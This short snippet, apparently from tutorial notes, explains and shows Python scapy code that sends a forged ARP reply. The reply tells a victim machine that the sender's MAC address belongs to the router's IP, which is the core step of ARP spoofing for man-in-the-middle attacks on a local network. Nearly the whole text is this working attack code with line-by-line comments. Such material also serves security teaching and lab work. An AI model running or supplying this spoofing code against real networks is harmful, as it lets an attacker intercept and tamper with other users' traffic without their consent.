target_ip --> ip of the machine we want to think we're router, spoof_ip --> router's ip address.
We sent an answer to victim machine with our MAC address and routers's IP, so we make it think that we are router.

packet = scapy.ARP(op=2, pdst=target_ip, hwdst=str(get_mac_by_ip(target_ip)), psrc=spoof_ip) # make an ARP answer

# op <==> 1 - request, 2 - answer
# pdst <==> ip of target machine
# hwdst <==> MAC address of target machine
# psrc <==> ip of router

scapy.send(packet, verbose=False) # send package, verbose=True <==> show message "Sent 1 package"
